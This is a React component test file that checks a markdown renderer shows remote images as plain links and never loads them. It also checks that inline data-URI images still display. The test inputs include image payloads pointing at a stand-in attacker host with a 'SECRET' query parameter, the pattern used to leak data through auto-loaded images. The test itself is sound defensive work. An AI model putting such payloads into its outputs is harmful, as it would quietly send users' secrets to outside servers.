// @vitest-environment happy-dom

import { readdirSync, readFileSync } from 'node:fs'
import { join, resolve } from 'node:path'
import { act } from 'react'
import { createRoot, type Root } from 'react-dom/client'
import { afterEach, beforeEach, describe, expect, it } from 'vitest'
import { WorkflowMarkdown } from './WorkflowMarkdown'

const pixel =
  'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII='

let root: Root | null = null
let container: HTMLDivElement | null = null

function render(content: string): HTMLDivElement {
  container = document.createElement('div')
  document.body.appendChild(container)
  root = createRoot(container)
  act(() => root?.render(<WorkflowMarkdown content={content} />))
  return container
}

describe('WorkflowMarkdown', () => {
  beforeEach(() => {
    globalThis.IS_REACT_ACT_ENVIRONMENT = true
  })

  afterEach(() => {
    act(() => root?.unmount())
    container?.remove()
    root = null
    container = null
  })

  it.each([
    '![chart](https://evil.example/c.png?d=SECRET)',
    '<img src="https://evil.example/c.png?d=SECRET" alt="chart">',
    '![chart](//evil.example/c.png?d=SECRET)',
    '![chart](https://github.com/user-attachments/assets/ce11040a-fb66-4289-927f-547b16dfc488)'
  ])('shows a remote image as a link and never loads it: %s', (content) => {
    const view = render(content)
    expect(view.querySelector('img')).toBeNull()
    const link = view.querySelector('a')
    expect(link?.textContent).toBe('chart')
    expect(link?.getAttribute('href')).toContain('.')
  })

  it('still shows an image carried inside the answer itself', () => {
    const view = render(`![dot](${pixel})`)
    expect(view.querySelector('img')?.getAttribute('src')).toBe(pixel)
  })

  it('is the only way workflow surfaces render markdown', () => {
    const roots = ['local-workflows', 'build-review', 'workflow-results', 'workflow-graph']
    const offenders = roots.flatMap((dir) => {
      const base = resolve('src/renderer/src/components', dir)
      return readdirSync(base, { recursive: true, encoding: 'utf8' })
        .filter((name) => /\.tsx?$/.test(name) && !/\.test\.tsx?$/.test(name))
        .filter((name) => !name.endsWith('WorkflowMarkdown.tsx'))
        .filter((name) =>
          readFileSync(join(base, name), 'utf8').includes('sidebar/CommentMarkdown')
        )
        .map((name) => `${dir}/${name}`)
    })
    expect(offenders).toEqual([])
  })
})
